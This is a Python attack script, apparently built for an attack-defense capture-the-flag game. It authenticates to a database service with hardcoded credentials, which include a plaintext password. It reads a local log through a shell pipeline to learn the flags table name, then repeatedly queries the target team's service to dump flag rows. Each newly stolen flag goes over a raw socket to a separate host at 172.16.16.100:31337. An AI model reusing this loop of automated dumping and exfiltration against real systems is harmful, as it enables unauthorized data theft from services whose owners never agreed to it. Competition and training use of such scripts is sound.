#!/usr/bin/python3

import hashlib, sys, json, time, random, string, urllib, os
import urllib.request
import urllib.error
import socket
import subprocess
from urllib.parse import *

CheckerLogin="DatabaseChecker"
CheckerPassword="DXjAtYeAq6extWEx"

def SendRequest(host, session, requestString):
    data=bytes(json.dumps({ "query" : requestString }), "ASCII")
    request=urllib.request.Request(host + ":16742", data)
    request.add_header("Cookie", "session=" + session)
    response = json.loads(urllib.request.urlopen(request).readall().decode('ascii'))
    #sys.stderr.write(response + "\n")
    return response

def Authorize(host):
    data=bytes(json.dumps({ "login" : CheckerLogin, "password" : CheckerPassword}), "ASCII")
    request=urllib.request.Request(host + "/login", data)
    request.add_header("X-Requested-With", "XMLHttpRequest")
    request.add_header("Content-Type", "application/json")
    response = urllib.request.urlopen(request)
    responseJson = json.loads(response.readall().decode('ascii'))
    if responseJson["status"] != "OK":
        if responseJson["error"]["code"] == 3:
            registerData = bytes(json.dumps({ "login" : CheckerLogin, "password" : CheckerPassword, "first_name" : "checker", "last_name" : "checker", "language" : "checker" }), "ASCII")
            #sys.stderr.write(registerData + "\n")
            registerRequest = urllib.request.Request(host + "/register", registerData)
            registerRequest.add_header("X-Requested-With", "XMLHttpRequest")
            registerRequest.add_header("Content-Type", "application/json")
            registerResponse = json.loads(urllib.request.urlopen(registerRequest).readall().decode('ascii'))
            #sys.stderr.write(registerResponse + "\n")
            if registerResponse["status"] != "OK":
                sys.stderr.write("Login system corrupted" + "\n")
                exit(110)
            response = urllib.request.urlopen(request).readall()
        else:
            sys.stderr.write("Some weird shit is happening with login system" + "\n")
            exit(110)
    return response.info()["Set-Cookie"].split("session=")[1]

if len(sys.argv) < 3:
    sys.stderr.write("Not enough parameters" + "\n")
    exit(110)

dictFile = open("./DatabaseChecker/Dictionary.txt")
dictionary = dictFile.read().split("\n")
dictFile.close()

AuthorizationHost = "http://" + sys.argv[2]
ExploitableHost = "http://" + sys.argv[2]
TeamName = sys.argv[2]
ExploitMode = sys.argv[1]

sys.stderr.write("Authorization..." + "\n")
session = Authorize(AuthorizationHost)

#sys.stderr.write("session is " + session + "\n")

flags = set({})

if ExploitMode == "sploit":
    while True:
        flagsTableName = subprocess.check_output('cat /var/log/database/service.log | grep "Query: insert into flags" | tail -n 1 | cut -d " " -f 4 | cut -d "." -f2', shell=True).decode('ASCII').rstrip()
        response = SendRequest(ExploitableHost, session, "selelect * from flags." + flagsTableName)
#        sys.stderr.write(str(response) + "\n")
        checkSys = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        checkSys.connect(("172.16.16.100", 31337))
        sys.stderr.write("Receiving from table " + flagsTableName + "\n")
        for e in response["data"]["rows"]:
            flag = e["flag"]
            if not flag in flags:
                flags.add(flag)
                sys.stderr.write("Sending flag: " + flag + "\n")
                checkSys.sendall(bytes(flag + "\r\n", 'ASCII'))
        checkSys.close()
        time.sleep(10)

sys.stderr.write("Mode is incorrect" + "\n")
exit(110)
